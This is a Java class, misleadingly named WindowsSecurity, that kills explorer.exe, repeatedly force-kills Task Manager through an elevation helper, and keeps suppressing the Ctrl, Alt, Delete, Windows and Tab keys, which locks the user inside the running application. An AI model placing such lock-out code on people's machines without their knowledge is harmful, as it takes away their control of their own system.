/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package main;

/**
 *
 * @author MOHAMED SHABEER KP
 */
import java.awt.Robot;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import javax.swing.JFrame;
import javax.swing.JPanel;


public class WindowsSecurity implements Runnable 
{
  public JPanel frame;
  public boolean running;

  public WindowsSecurity(JPanel yourFrame)
  {
    frame = yourFrame;
    running=true;
    new Thread(this).start();
  }
  
     @Override
    public void run() {
        try {
     
      //this.terminal.getParentFrame().setDefaultCloseOperation(0);
      kill("explorer.exe"); // Kill explorer
      Robot robot = new Robot();
      while (running) {
       sleep(30L);
       releaseKeys(robot);
       sleep(15L);
       String line;
       String pidInfo ="";

       Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"tasklist.exe");
       BufferedReader input =  new BufferedReader(new InputStreamReader(p.getInputStream()));

       while ((line = input.readLine()) != null) {
       pidInfo+=line; 
}

       input.close();

       if(pidInfo.contains("Taskmgr.exe"))
       {
       kill("taskmgr.exe");
       }
       releaseKeys(robot);         
      }
    } catch (Exception e) {
    System.out.println(e);
    }
    }
  
  public void stop()
  {
     this.running = false;
  }

  private void releaseKeys(Robot robot) {
    robot.keyRelease(17);
    robot.keyRelease(18);
    robot.keyRelease(127);
    robot.keyRelease(524);
    robot.keyRelease(9);
  }

  private void sleep(long millis) {
    try {
      Thread.sleep(millis);
    } catch (Exception e) {

    }
  }

  private void kill(String string) {
    try {
        if(!string.equals("taskmgr.exe"))
      Runtime.getRuntime().exec("taskkill /F /IM " + string).waitFor();
     else
      Runtime.getRuntime().exec("src//Elevate64.exe TASKKILL /F /IM Taskmgr.exe").waitFor(); 
    } catch (Exception e) {
    }
  }
}

